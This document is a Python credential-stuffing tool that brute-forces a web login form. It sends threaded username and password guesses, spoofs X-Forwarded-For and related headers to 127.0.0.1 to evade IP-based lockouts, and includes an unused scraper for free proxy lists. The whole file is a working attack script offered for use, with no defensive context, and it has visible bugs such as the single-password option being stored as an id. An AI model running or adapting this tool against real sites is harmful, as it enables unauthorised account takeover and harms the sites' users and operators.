import requests
import threading
from bs4 import BeautifulSoup                                                           
import argparse

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Originating-IP": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
    }

def sendreq(url, passw, uid, isPresent, isAbsent):
    res = ""
    try:
        res=requests.post(url,data={
                          "username": uid,
                          "password": passw
                        },json={
                          "username": uid,
                          "password": passw
                        }, headers=headers).text
    except Exception as e:
        print(e)
        res = ""
    if res and ((isPresent and isPresent in res) or (isAbsent and isAbsent not in res)):
        print("uid-",uid)
        print("pass-",passw)



    

def getIPs():
    response = requests.get("https://sslproxies.org/") 
    soup = BeautifulSoup(response.content, 'html5lib') 
    ips = [ip.text for ip in soup.findAll('td')[::8]]
    ports = [port.text for port in soup.findAll('td')[1::8]]
    IPList = [ips[i]+":" + ports[i] for i in range(len(ips))]
    IPList = [proxy for proxy in IPList if proxy[0].isnumeric()]
    print()
    return IPList

def bruteforce(url, idList, passList, isPresent, isAbsent):
    for uid in idList:
        T =[]
        for passw in passList:
            t = threading.Thread(target=sendreq, args=(url, passw, uid, isPresent, isAbsent))
            t.start()
            T.append(t)
        for t in T:
            t.join()

def readFile(fileName):
    with open(fileName, "r") as f:
        items = f.readlines()
        items = [item[:-1] for item in items]
        return items

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--url', '-u',
                         action='store',
                         required=True,
                         help='bruteforce url')
    passwords_group = parser.add_mutually_exclusive_group(required=True)
    passwords_group.add_argument('--password', '  ',
                                 action='store',
                                 help='single password')
    passwords_group.add_argument('--password-file', '-pf',
                                 action='store',
                                 help='path to passwords file')
    ids_group = parser.add_mutually_exclusive_group(required=True)
    ids_group.add_argument('--id', '-i',
                           action='store',
                           help='single id')
    ids_group.add_argument('--id-file', '-if',
                           action='store',
                           help='path to ids file')
    identifier_group = parser.add_mutually_exclusive_group(required=True)
    identifier_group.add_argument('--is-present', '-ip',
                                 action='store',
                                 help='if present in response terminates the bruteforce')
    identifier_group.add_argument('--is-not-present', '-inp',
                                 action='store',
                                 help='value if not present in response terminates the bruteforce')
    options = parser.parse_args()
    
    url = options.url
    passwords = []
    ids = []
    if options.password:
        ids = [options.password]
    else:
        passwords = readFile(options.password_file)
    
    if options.id:
        ids = [options.id]
    else:
        ids = readFile(options.id_file)
    isPresent = options.is_present 
    isNotPresent = options.is_not_present
    bruteforce(url, ids, passwords, isPresent, isNotPresent)

if __name__=="__main__":
    main()
